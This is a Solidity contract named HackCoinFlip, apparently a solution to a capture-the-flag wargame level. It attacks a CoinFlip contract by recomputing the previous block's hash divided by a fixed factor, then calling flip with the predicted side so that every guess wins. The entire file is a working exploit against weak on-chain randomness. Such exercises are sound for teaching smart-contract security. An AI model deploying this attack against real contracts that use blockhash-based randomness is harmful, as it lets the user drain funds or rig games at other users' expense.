pragma solidity ^0.5.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v2.5.0/contracts/math/SafeMath.sol";

import "./CoinFlip.sol";

contract HackCoinFlip {
    using SafeMath for uint256;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public coinFlipAddr;
    
    constructor (address _coinFlipAddr) public {
        coinFlipAddr = _coinFlipAddr;
    }
    
    function hack() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        
        bool res = CoinFlip(coinFlipAddr).flip(side);
        return res;
    }
}